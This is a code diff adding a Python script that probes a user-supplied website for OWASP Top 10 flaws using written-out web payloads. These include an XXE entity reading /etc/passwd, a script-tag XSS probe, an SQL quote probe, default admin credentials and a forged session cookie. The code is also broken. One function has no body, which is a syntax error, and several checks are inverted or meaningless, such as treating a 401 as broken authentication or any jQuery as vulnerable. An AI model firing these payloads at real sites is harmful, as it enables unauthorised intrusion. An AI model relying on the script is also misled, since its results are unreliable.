@@ -1,0 +1,89 @@
+import requests
+from bs4 import BeautifulSoup
+
+# Function to test for each vulnerability
+def test_injection(website_url):
+    response = requests.get(website_url + "search?q='")
+    if 'SQL syntax' in response.text:
+        print("SQL Injection vulnerability found")
+    else:
+        print("No SQL Injection vulnerability")
+
+def test_broken_auth(website_url):
+    response = requests.get(website_url + "admin", auth=('admin', 'password'))
+    if response.status_code == 401:
+        print("Broken Authentication vulnerability found")
+    else:
+        print("No Broken Authentication vulnerability")
+
+def test_sensitive_data_exposure(website_url):
+    response = requests.get(website_url + "user/1")
+    if 'password' in response.text:
+        print("Sensitive Data Exposure vulnerability found")
+    else:
+        print("No Sensitive Data Exposure vulnerability")
+
+def test_xml_external_entities(website_url):
+    xml_data = '''<?xml version="1.0"?>
+    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <data>&xxe;</data>'''
+    response = requests.post(website_url + "xml", data=xml_data)
+    if 'root:' in response.text:
+        print("XML External Entities vulnerability found")
+    else:
+        print("No XML External Entities vulnerability")
+
+def test_security_misconfiguration(website_url):
+    response = requests.get(website_url + "admin", allow_redirects=False)
+    if response.status_code == 200:
+        print("Security Misconfiguration vulnerability found")
+    else:
+        print("No Security Misconfiguration vulnerability")
+
+def test_cross_site_scripting(website_url):
+    response = requests.get(website_url + "search?q=<script>alert('XSS')</script>")
+    if "<script>alert('XSS')</script>" in response.text:
+        print("Cross-Site Scripting vulnerability found")
+    else:
+        print("No Cross-Site Scripting vulnerability")
+
+def test_insecure_deserialization(website_url):
+    cookie = {'session': 'eyJpdiI6IjU0OENlTXU0YjR5T0dGUEVYclwvZz09IiwidmFsdWUiOiJpUG9oWmJIRUk2MWg5c3ZoUVV6a0NRUVVnWlN3cGJ6WVBuYk1JOWR4R3lKSHVMKzBMSURpczNidnZ0QjRKanEiLCJtYWMiOiI4NjE5Y2Y5YTYwOGYwMjY5YjRhNjNmZmY2MjFjOTQ4OWJmMTE3Mjc2NzUwMDM5YzE1ZjRkNTEwZTI5NDg2MzVkIn0%3D'}
+    response = requests.get(website_url + "profile", cookies=cookie)
+    if "Welcome admin" in response.text:
+        print("Insecure Deserialization vulnerability found")
+    else:
+        print("No Insecure Deserialization vulnerability")
+
+def test_using_components_with_known_vulnerabilities(website_url):
+    response = requests.get(website_url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    libraries = ['jquery.js', 'bootstrap.css']  # Add more libraries if needed
+    vulnerabilities_found = []
+    for library in libraries:
+        if soup.find('script', src=lambda x: x and library in x):
+            vulnerabilities_found.append(library)
+    if vulnerabilities_found:
+        print("Using Components with Known Vulnerabilities found:", vulnerabilities_found)
+    else:
+        print("No Using Components with Known Vulnerabilities")
+
+def test_insufficient_logging_and_monitoring(website_url):
+    # This is a placeholder. Insufficient logging and monitoring generally requires manual inspection.
+
+# Run the tests
+def run_tests():
+    website_url = input("Enter the URL of the website you want to test: ")
+    if not website_url.startswith('http://') and not website_url.startswith('https://'):
+        website_url = 'http://' + website_url
+    test_injection(website_url)
+    test_broken_auth(website_url)
+    test_sensitive_data_exposure(website_url)
+    test_xml_external_entities(website_url)
+    test_security_misconfiguration(website_url)
+    test_cross_site_scripting(website_url)
+    test_insecure_deserialization(website_url)
+    test_using_components_with_known_vulnerabilities(website_url)
+    test_insufficient_logging_and_monitoring(website_url)
+
+run_tests()
